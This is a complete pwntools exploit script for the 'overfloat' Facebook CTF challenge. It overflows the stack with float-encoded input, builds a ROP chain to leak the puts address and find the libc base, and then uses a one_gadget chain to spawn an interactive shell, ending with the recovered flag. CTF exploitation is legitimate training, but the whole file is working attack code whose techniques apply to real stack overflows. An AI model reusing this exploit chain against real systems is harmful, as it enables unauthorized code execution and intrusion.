#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *
from os import system

exe = context.binary = ELF('overfloat')

host = args.HOST or 'challenges.fbctf.com'
port = int(args.PORT or 1341)

ENV={'LD_PRELOAD':'./libc-2.27.so'}
def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, env=ENV, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, env=ENV, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
break *0x400A1E
continue
'''.format(**locals())

# -- Exploit goes here --

context.terminal = ['tmux', 'split', '-h']
io = start()

def snd(s):
    io.sendlineafter(':', str(s))

def snd_rop(rop, precision=99):
    with open('ropchain', 'wb') as f:
        f.write(rop)
    system('./convert > ropchain.float')
    with open('ropchain.float', 'r') as f:
        lines = f.readlines()

        for line in lines:
            if line.replace('0', '') == '.\n': continue
            print ('Sent {}'.format(line.strip()[:99]))
            snd(line.strip()[:precision])

def prep(x):
    for i in range(x):
        snd(0.0)

# prepare the overflow
prep(14)

# stage 1 rop chain for the leak
rop = ROP(exe)
rop.puts(exe.got['puts'])
rop.main()
log.info(rop.dump())
rop = rop.chain()
snd_rop(rop)
snd("done")

# get the leak
io.recvuntil('BON VOYAGE!')
io.recvline()
addr = io.recvline().strip()
addr = addr + '\x00' * (8 - len(addr))
addr = u64(addr)
log.success("puts: {}".format(hex(addr)))
libc = ELF('./libc-2.27.so')
libc.address = addr - libc.symbols['puts']
log.success("libc: {}".format(hex(libc.address)))

# stage 2 get shell
prep(14)
rop = ROP(libc)
gadgets = [0x4f2c5, 0x4f322, 0x10a38c]
rop.raw(libc.address + gadgets[0])
log.info(rop.dump())
rop = rop.chain()
snd_rop(rop, precision=50)
snd("done")

io.interactive()
# fb{FloatsArePrettyEasy...}

